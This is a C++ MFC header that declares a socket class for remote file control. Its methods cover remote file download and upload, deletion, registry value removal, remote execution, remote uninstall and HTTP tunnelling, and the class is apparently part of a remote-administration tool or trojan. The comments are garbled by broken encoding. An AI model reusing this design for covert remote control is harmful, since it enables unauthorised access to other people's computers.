//Download by http://www.NewXing.com
// FileSocket.h: interface for the CFileSocket class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_FILESOCKET_H__8B751501_1864_11D5_89D9_1CA905C10000__INCLUDED_)
#define AFX_FILESOCKET_H__8B751501_1864_11D5_89D9_1CA905C10000__INCLUDED_

#if _MSC_VER >= 1000
#pragma once
#endif // _MSC_VER >= 1000

#include <afxinet.h>
//*************************************
#pragma pack(1) //�ֽڶ���

#pragma pack()	//ʹ��ȱʡ����
//*************************************

class CFileSocket  
{
public:
	CFileSocket();
	virtual ~CFileSocket();

public:
	//*****************************************************************
	////////////////////////��Ա����/////////////////////////////
	CCommunity*			m_pCommunity;		//����֪ͨ���ָ��

	CString				m_strServerIP;		//��������IP��ַ(���ͻ���)

	SOCKET				m_hConnectSocket;	//����Socket

	CInternetSession*	m_pSession;			//HTTP������ӵ�Internet�Ự
	CHttpConnection*	m_pHttpConn;		//HTTP������ӵ�HTTP����
	CHttpFile*			m_pHttpFile;		//HTTP������ӵ�HTTP�ļ�
	////////////////////////��Ա����/////////////////////////////
	void	Initial();
	void	OnSocketClose();
	void	ConnectServer();
	void	RecvCommand(DWORD dwCommandID=0);
	//*****************************************************************
private:
	//*****************************************************************
	////////////////////////��Ա����/////////////////////////////
	CByteArray		m_ArrayBuffer;
	////////////////////////��Ա����/////////////////////////////
	void	CStringToChar(char* cText,CString strText,UINT nSize=NULL);
	CString	CharToCString(char* cText,UINT nSize);
	CString GetDiskVolume(CString strDiskDriveName);
	DWORDLONG GetDiskSpace(CString strDiskDriver,BOOL bFreeSpace);
	void	SearchFile_GetOperationObject(CString strFindDir,
	int		nPathLen,CByteArray* pArrayBuffer);
	void	CreateMultilevelDir(CString strDirName);
	void	FolderStatistic(CString strFindDir,int* nFileCount,int* nFolderCount,DWORD* dwTotalSize);
	void	RegDeleteValue(HKEY hKey,CString sKey,CString sChildKey);
	void	SearchFile(CString strFindDir,CString strFindFile,BOOL bSearchSubdir,CByteArray* pArrayBuffer);
	BOOL	IsFileExist(CString strFilename);//����ָ���ļ��Ƿ����

	void	Command_IDVerify();
	void	Command_DownloadDiskDriveInfo();
	void	Command_ExpandDirectory();
	void	Command_ShowFileList();
	void	Command_RenameFile();
	void	Command_NewFile();
	void	Command_NewFolder();
	void	Command_DeleteFile();
	void	Command_RemotePaste();
	void	Command_GetOperationObject();
	void	Command_DownloadFile();
	void	Command_UploadFile();
	void	Command_ShowProperty_Multi();
	void	Command_ShowProperty_Single();
	void	Command_ModifyProperty_Single();
	void	Command_ShowProperty_Diskdrive();
	void	Command_ModifyProperty_Diskdrive();
	void	Command_RemoteRun();
	void	Command_RemoteUninstall();
	void	Command_FindFile();
	void	Command_ShowNote();
	void	Command_GetFileInfo();

	DWORD	RecvCommandParamSize(SOCKET hSocket);//�������������С
	BOOL	RecvCommandParam(SOCKET hSocket,BYTE* byBuf,DWORD dwBufSize);//�����������
	BOOL	SendCommandData(SOCKET hSocket,int nControlCode,BYTE* byBuf,DWORD dwBufSize);//������������

	BOOL	CFileSocket::HttpTunnelSendHeader(UINT nCount);//����HTTPͷ
	BOOL	CFileSocket::HttpTunnelSend(const void* lpBuf,UINT nCount);//����HTTP����
	BOOL	CFileSocket::HttpTunnelRecvHeader();//����HTTPͷ
	int		CFileSocket::HttpTunnelRecv(void* lpBuf,UINT nCount);//����HTTP����
	//*****************************************************************
};

#endif // !defined(AFX_FILESOCKET_H__8B751501_1864_11D5_89D9_1CA905C10000__INCLUDED_)
